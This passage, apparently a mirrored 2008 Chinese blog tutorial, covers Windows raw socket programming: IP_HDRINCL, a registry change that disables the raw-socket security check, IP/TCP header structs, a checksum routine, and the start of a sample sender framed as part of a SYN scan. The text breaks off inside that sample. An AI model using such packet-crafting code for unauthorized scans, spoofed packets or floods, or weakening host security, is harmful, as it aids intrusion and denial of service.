
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>raw socket 编程</title>
    <link rel="stylesheet" href="css/common/351df2a8316f113f252ef2bb9edfaf0a.css">
    <link rel="stylesheet" href="css/common/762f7595fdc29098c10bedc44fb08d79.css">
    <link rel="stylesheet" href="css/common/25978cf10b5368d50d66d027f7ac6995.css">
    <link rel="stylesheet" href="css/common/01256533b5796652379f01b9d5d2a4e1.css">
    <link rel="stylesheet" href="css/common/3456820cac63d19e4c744608c87562e9.css">
    <link rel="stylesheet" href="css/common/24f21657c5465ed6e144fb4401350e07.css">
    <link rel="stylesheet" href="css/common/1a98987dfda088c62bb1183b9ebd77b8.css">
    <link rel="stylesheet" href="css/common/704d5b9767516f50879128f39374a65a.css">
    <link rel="stylesheet" href="css/common/7fec870fdbedeaba28df5c37ac431c1d.css">
    <link rel="stylesheet" href="css/common/7ebfc34abf5dd1ce6de5f5865a58ff24.css">
    <link rel="stylesheet" href="css/common/40f864214c8f1419f9c655aaf1b6fa71.css">
    <link rel="stylesheet" href="css/common/inline_035309477599f7645e5ab0f64693e50a.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-okaidia.min.css">

    <style>
        /* 保留CSDN常用的文本颜色类 */
        .text-red, [class*="text-red"] { color: red !important; }
        .text-blue, [class*="text-blue"] { color: blue !important; }
        .text-green, [class*="text-green"] { color: green !important; }
        .text-yellow, [class*="text-yellow"] { color: #FFD700 !important; }
        .text-purple, [class*="text-purple"] { color: purple !important; }
        .text-orange, [class*="text-orange"] { color: orange !important; }
        
        /* 保留常见的CSDN文本样式类 */
        .bold, .strong, [class*="bold"], [class*="strong"] { font-weight: bold !important; }
        .italic, .em, [class*="italic"], [class*="em"] { font-style: italic !important; }
        .underline, [class*="underline"] { text-decoration: underline !important; }
        
        /* 确保内联样式不被覆盖 */
        .article-content * { color: initial; background-color: initial; font-weight: initial; font-style: initial; text-decoration: initial; }
        
        /* 保留font标签的color属性 */
        .article-content font[color="red"] { color: red !important; }
        .article-content font[color="blue"] { color: blue !important; }
        .article-content font[color="green"] { color: green !important; }
        .article-content font[color="yellow"] { color: yellow !important; }
        .article-content font[color="purple"] { color: purple !important; }
        .article-content font[color="orange"] { color: orange !important; }
        .article-content font[color="black"] { color: black !important; }
        .article-content font[color="white"] { color: white !important; }
        .article-content font[color="gray"] { color: gray !important; }
        .article-content font[color="#000000"] { color: #000000 !important; }
        .article-content font[color="#FF0000"] { color: #FF0000 !important; }
        .article-content font[color="#00FF00"] { color: #00FF00 !important; }
        .article-content font[color="#0000FF"] { color: #0000FF !important; }
        .article-content font[color="#FFFF00"] { color: #FFFF00 !important; }
        .article-content font[color="#00FFFF"] { color: #00FFFF !important; }
        .article-content font[color="#FF00FF"] { color: #FF00FF !important; }
    </style>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; max-width: 1200px; margin: 0 auto; background-color: #f8f9fa; }
        img { max-width: 100%; height: auto; }
        pre { background-color: #2d2d2d; padding: 10px; border-radius: 5px; overflow-x: auto; margin: 1em 0; }
        code { font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace; }
        pre[class*="language-"] { position: relative; }
        pre[class*="language-"] .copy-to-clipboard-button { position: absolute; top: 5px; right: 5px; background: rgba(0,0,0,0.3); color: white; border: none; border-radius: 3px; padding: 5px 10px; font-size: 0.8em; cursor: pointer; }
        pre[class*="language-"] .copy-to-clipboard-button:hover { background: rgba(0,0,0,0.5); }
        pre[class*="language-"] code { user-select: all; -webkit-user-select: all; -moz-user-select: all; -ms-user-select: all; }
        pre[class*="language-"]:hover .copy-to-clipboard-button { display: block; }
        pre[class*="language-"] .copy-to-clipboard-button { display: none; }
        .source-link { margin-bottom: 15px; color: #666; }
        h1 { font-size: 28px; margin-bottom: 15px; color: #333; }
        .article-content { margin-top: 25px; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        /* 文章元数据样式 */
        .article-meta { 
            display: flex; 
            flex-wrap: wrap; 
            gap: 15px; 
            font-size: 14px; 
            color: #666; 
            margin-bottom: 15px; 
        }
        .meta-item { 
            display: flex; 
            align-items: center; 
        }
        .meta-item i { 
            margin-right: 5px; 
            color: #0066cc; 
        }
        
        /* 标签样式 */
        .article-tags { 
            margin-bottom: 15px; 
        }
        .tag { 
            display: inline-block; 
            background-color: #e6f2ff; 
            color: #0066cc; 
            padding: 3px 8px; 
            border-radius: 4px; 
            font-size: 12px; 
            margin-right: 5px; 
        }
        
        /* 描述样式 */
        .article-description { 
            background-color: #f5f5f5; 
            padding: 15px; 
            border-left: 4px solid #0066cc; 
            margin-bottom: 20px; 
            font-style: italic; 
            color: #555; 
        }
        .token.comment, .token.prolog, .token.doctype, .token.cdata { color: #8292a2; }
        .token.punctuation { color: #f8f8f2; }
        .token.namespace { opacity: .7; }
        .token.property, .token.tag, .token.constant, .token.symbol, .token.deleted { color: #f92672; }
        .token.boolean, .token.number { color: #ae81ff; }
        .token.selector, .token.attr-name, .token.string, .token.char, .token.builtin, .token.inserted { color: #a6e22e; }
        .token.operator, .token.entity, .token.url, .language-css .token.string, .style .token.string, .token.variable { color: #f8f8f2; }
        .token.atrule, .token.attr-value, .token.function, .token.class-name { color: #e6db74; }
        .token.keyword { color: #66d9ef; }
        .token.regex, .token.important { color: #fd971f; }
        .token.important, .token.bold { font-weight: bold; }
        .token.italic { font-style: italic; }
        .token.entity { cursor: help; }
        
        /* 添加header和footer样式 */
        .header { 
            padding: 10px 0; 
            margin-bottom: 20px; 
            border-bottom: 1px solid #eee; 
        }
        .header a { 
            text-decoration: none; 
            color: #007bff; 
            font-weight: bold; 
        }
        .header a:hover { 
            text-decoration: underline; 
        }
        .footer { 
            margin-top: 30px; 
            padding-top: 20px; 
            border-top: 1px solid #eee; 
            color: #666; 
            font-size: 0.9em; 
            text-align: center; 
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="index.html">← 返回目录</a>
    </div>
    
    <h1>raw socket 编程</h1>
    <div class="source-link">原文链接: <a href="https://blog.csdn.net/aerror/article/details/2467715" target="_blank">https://blog.csdn.net/aerror/article/details/2467715</a></div>
    
    <div class="article-meta">
        <div class="meta-item"><i class="far fa-calendar-alt"></i> 发布时间: 2008-05-21 22:40:00</div>
        <div class="meta-item"><i class="far fa-eye"></i> 浏览量: 1334</div>
        
        <div class="meta-item"><i class="far fa-star"></i> 收藏数: 2</div>
        
    </div>
    
    <div class="article-tags">标签: <span class="tag">socket</span>, <span class="tag">sockets</span>, <span class="tag">tcp</span>, <span class="tag">microsoft</span>, <span class="tag">buffer</span>, <span class="tag">windows</span></div>
    
    <div class="article-description">Microsoft TCP/IP 组件包含“核心协议”、“服务”及两者之间的“接口”。传输驱动程序接口 (TDI) 与网络设备接口规范 (NDIS) 是公用的。 此外，还有许多用户模型应用程序的更高级接口。最常用的接口是 Windows Sockets、远程过程调用 (RPC) 和 NetBIOS。 Windows Sockets 是一个编程接口，它是在加州大学伯克利分校开发的套接字接口的基础</div>
    
    <div class="article-content">
        <div class="htmledit_views atom-one-dark" id="content_views">
<p>Microsoft TCP/IP 组件包含“核心协议”、“服务”及两者之间的“接口”。传输驱动程序接口 (TDI) 与网络设备接口规范 (NDIS) 是公用的。 此外，还有许多用户模型应用程序的更高级接口。最常用的接口是 Windows Sockets、远程过程调用 (RPC) 和 NetBIOS。 </p>
<p>Windows Sockets 是一个编程接口，它是在加州大学伯克利分校开发的套接字接口的基础上定义的。它包括了一组扩展件，以充分利用 Microsoft Windows 消息驱动的特点。规范的 1.1 版是在 1993 年 1 月发行的，2.2.0 版在 1996 年 5 月发行。Windows 2000 支持 Winsock 2.2 版。在Winsock2中，支持多个传输协议的原始套接字，重叠I/O模型、服务质量控制等。 </p>
<p>这 里介绍Windows Sockets的一些关于原始套接字(Raw Socket)的编程。同Winsock1相比，最明显的就是支持了Raw Socket套接字类型，通过原始套接字，我们可以更加自如地控制Windows下的多种协议，而且能够对网络底层的传输机制进行控制。 </p>
<p>1、创建一个原始套接字，并设置IP头选项。 </p>
<p>SOCKET sock; <br/>sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP); <br/>或者： <br/>s = WSASoccket(AF_INET,SOCK_RAW,IPPROTO_IP,NULL,0,WSA_FLAG_OVERLAPPED); </p>
<p>这 里，我们设置了SOCK_RAW标志，表示我们声明的是一个原始套接字类型。创建原始套接字后，IP头就会包含在接收的数据中，如果我们设定 IP_HDRINCL 选项，那么，就需要自己来构造IP头。注意，如果设置IP_HDRINCL 选项，那么必须具有 administrator权限，要不就必须修改注册表： <br/>HKEY_LOCAL_MacHINE/System/CurrentControlSet/Services/Afd/Parameter/ <br/>修改键：DisableRawSecurity（类型为DWord），把值修改为 1。如果没有，就添加。 </p>
<p>BOOL blnFlag=TRUE; <br/>setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&amp;blnFlag, sizeof(blnFlag); </p>
<p>对于原始套接字在接收数据报的时候，要注意这么几点： <br/>1、如果接收的数据报中协议类型和定义的原始套接字匹配，那么，接收的所有数据就拷贝到套接字中。 <br/>2、如果绑定了本地地址，那么只有接收数据IP头中对应的远端地址匹配，接收的数据就拷贝到套接字中。 <br/>3、如果定义的是外部地址，比如使用connect()，那么，只有接收数据IP头中对应的源地址匹配，接收的数据就拷贝到套接字中。 </p>
<p><br/>2、构造IP头和TCP头 </p>
<p>这里，提供IP头和TCP头的结构： </p>
<p>// Standard TCP flags <br/>#define URG 0x20 <br/>#define ACK 0x10 <br/>#define PSH 0x08 <br/>#define RST 0x04 <br/>#define SYN 0x02 <br/>#define FIN 0x01 <br/>typedef struct _iphdr //定义IP首部 <br/>{ <br/>unsigned char h_lenver; //4位首部长度+4位IP版本号 <br/>unsigned char tos; //8位服务类型TOS <br/>unsigned short total_len; //16位总长度（字节） <br/>unsigned short ident; //16位标识 <br/>unsigned short frag_and_flags; //3位标志位 <br/>unsigned char ttl; //8位生存时间 TTL <br/>unsigned char proto; //8位协议 (TCP, UDP 或其他) <br/>unsigned short checksum; //16位IP首部校验和 <br/>unsigned int sourceIP; //32位源IP地址 <br/>unsigned int destIP; //32位目的IP地址 <br/>}IP_HEADER; <br/><br/>typedef struct psd_hdr //定义TCP伪首部 <br/>{ <br/>unsigned long saddr; //源地址 <br/>unsigned long daddr; //目的地址 <br/>char mbz; <br/>char ptcl; //协议类型 <br/>unsigned short tcpl; //TCP长度 <br/>}PSD_HEADER; <br/><br/>typedef struct _tcphdr //定义TCP首部 <br/>{ <br/>USHORT th_sport; //16位源端口 <br/>USHORT th_dport; //16位目的端口 <br/>unsigned int th_seq; //32位序列号 <br/>unsigned int th_ack; //32位确认号 <br/>unsigned char th_lenres; //4位首部长度/6位保留字 <br/>unsigned char th_flag; //6位标志位 <br/>USHORT th_win; //16位窗口大小 <br/>USHORT th_sum; //16位校验和 <br/>USHORT th_urp; //16位紧急数据偏移量 <br/>}TCP_HEADER; <br/><br/>TCP伪首部并不是真正存在的，只是用于计算检验和。校验和函数： <br/><br/>USHORT checksum(USHORT *buffer, int size) <br/>{ <br/>unsigned long cksum=0; <br/>while (size &gt; 1) <br/>{ <br/>cksum += *buffer++; <br/>size -= sizeof(USHORT); <br/>} <br/>if (size) <br/>{ <br/>cksum += *(UCHAR*)buffer; <br/>} <br/>cksum = (cksum &gt;&gt; 16) + (cksum &amp; 0xffff); <br/>cksum += (cksum &gt;&gt;16); <br/>return (USHORT)(~cksum); <br/>} <br/><br/>当需要自己填充IP头部和TCP头部的时候，就同时需要自己计算他们的检验和。 <br/>3、发送原始套接字数据报 <br/><br/>填充这些头部稍微麻烦点，发送就相对简单多了。只需要使用sendto()就OK。 <br/><br/>sendto(sock, (char*)&amp;tcpHeader, sizeof(tcpHeader), 0, (sockaddr*)&amp;addr_in,sizeof(addr_in)); <br/><br/>下面是一个示例程序，可以作为SYN扫描的一部分。 </p>
<p>发送:</p>
<div style="BORDER-RIGHT: windowtext 0.5pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: windowtext 0.5pt solid; PADDING-LEFT: 5.4pt; BACKGROUND: #e6e6e6; PADDING-BOTTOM: 4px; BORDER-LEFT: windowtext 0.5pt solid; WIDTH: 95%; WORD-BREAK: break-all; PADDING-TOP: 4px; BORDER-BOTTOM: windowtext 0.5pt solid">
<div>
<img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif">
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"> fistippacket.cpp : 定义控制台应用程序的入口点。<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif">#include </img></span>
<span style="COLOR: #000000">"</span>
<span style="COLOR: #000000">stdafx.h</span>
<span style="COLOR: #000000">"</span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif">#include </img></span>
<span style="COLOR: #000000">&lt;</span>
<span style="COLOR: #000000">winsock2.h</span>
<span style="COLOR: #000000">&gt;</span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif">#include </img></span>
<span style="COLOR: #000000">&lt;</span>
<span style="COLOR: #000000">ws2tcpip.h</span>
<span style="COLOR: #000000">&gt;</span>
<span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif">#include </img></span>
<span style="COLOR: #000000">&lt;</span>
<span style="COLOR: #000000">windows.h</span>
<span style="COLOR: #000000">&gt;</span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">What new functionality is added to this feature in Windows XP Service Pack 2?<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">Restricted traffic over raw sockets<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">Detailed description <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">A very small number of Windows applications make use of raw IP sockets, which provide an industry-standard way for applications to create TCP/IP packets with fewer integrity and security checks by the TCP/IP stack. The Windows implementation of TCP/IP still supports receiving traffic on raw IP sockets. However, the ability to send traffic over raw sockets has been restricted in two ways:<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">TCP data cannot be sent over raw sockets.<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">UDP datagrams with invalid source addresses cannot be sent over raw sockets. The IP source address for any outgoing UDP datagram must exist on a network interface or the datagram is dropped. <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">Why is this change important? What threats does it help mitigate? <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">This change limits the ability of malicious code to create distributed denial-of-service attacks and limits the ability to send spoofed packets, which are TCP/IP packets with a forged source IP address.<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">Regards,<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">Nelson.<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #008000">//<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">static</span>
<span style="COLOR: #000000"> unsigned </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> s_sendount </span>
<span style="COLOR: #000000">=</span>
<span style="COLOR: #000000">1000</span>
<span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">static</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">char</span>
<span style="COLOR: #000000"> s_destip[</span>
<span style="COLOR: #000000">100</span>
<span style="COLOR: #000000">]</span>
<span style="COLOR: #000000">=</span>
<span style="COLOR: #000000">""</span>
<span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">static</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000">    s_destport   </span>
<span style="COLOR: #000000">=</span>
<span style="COLOR: #000000">0</span>
<span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">static</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">char</span>
<span style="COLOR: #000000"> s_srcip[</span>
<span style="COLOR: #000000">100</span>
<span style="COLOR: #000000">] </span>
<span style="COLOR: #000000">=</span>
<span style="COLOR: #000000">""</span>
<span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">static</span>
<span style="COLOR: #000000"> </span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000">    s_srcport    </span>
<span style="COLOR: #000000">=</span>
<span style="COLOR: #000000">0</span>
<span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">#define</span>
<span style="COLOR: #000000"> SOURCE_PORT 7234 </span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">#define</span>
<span style="COLOR: #000000"> MAX_RECEIVEBYTE 255 </span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">#pragma</span>
<span style="COLOR: #000000"> pack(push,1)</span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/>typedef </span>
<span style="COLOR: #0000ff">struct</span>
<span style="COLOR: #000000"> ip_hdr </span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">定义IP首部 </span>
<span style="COLOR: #008000"><br/><img align="top" alt="" id="_1485_1868_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_1485_1868_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_1485_1868_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_1485_1868_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> h_verlen; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">4位首部长度,4位IP版本号 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> tos; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">8位服务类型TOS </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">short</span><span style="COLOR: #000000"> total_len; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位总长度（字节） </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">short</span><span style="COLOR: #000000"> ident; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位标识 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">short</span><span style="COLOR: #000000"> frag_and_flags; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">3位标志位 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> ttl; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">8位生存时间 TTL </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> proto; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">8位协议 (TCP, UDP 或其他) </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">short</span><span style="COLOR: #000000"> checksum; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位IP首部校验和 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> sourceIP; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">32位源IP地址 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> destIP; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">32位目的IP地址 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/></span><span style="COLOR: #000000">}</span></span>
<span style="COLOR: #000000">IPHEADER; <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/>typedef </span>
<span style="COLOR: #0000ff">struct</span>
<span style="COLOR: #000000"> tsd_hdr </span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">定义TCP伪首部 </span>
<span style="COLOR: #008000"><br/><img align="top" alt="" id="_1916_2041_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_1916_2041_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_1916_2041_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_1916_2041_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    unsigned </span><span style="COLOR: #0000ff">long</span><span style="COLOR: #000000"> saddr; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">源地址 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">long</span><span style="COLOR: #000000"> daddr; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">目的地址 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> mbz; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> ptcl; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">协议类型 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">short</span><span style="COLOR: #000000"> tcpl; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">TCP长度 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/></span><span style="COLOR: #000000">}</span></span>
<span style="COLOR: #000000">PSDHEADER; <br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/>typedef </span>
<span style="COLOR: #0000ff">struct</span>
<span style="COLOR: #000000"> tcp_hdr </span>
<span style="COLOR: #008000">//</span>
<span style="COLOR: #008000">定义TCP首部 </span>
<span style="COLOR: #008000"><br/><img align="top" alt="" id="_2089_2371_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_2089_2371_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_2089_2371_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_2089_2371_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    USHORT th_sport; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位源端口 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    USHORT th_dport; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">16位目的端口 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> th_seq; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">32位序列号 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> th_ack; </span><span style="COLOR: #008000">//</span><span style="COLOR: #008000">32位确认号 </span><span style="COLOR: #008000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/></span><span style="COLOR: #000000">    unsigned </span><span style="COLOR: #0000ff">char</span><span style="COLOR: #000000"> th_lenres; </span><span style="COLOR: #008000">//</span><span 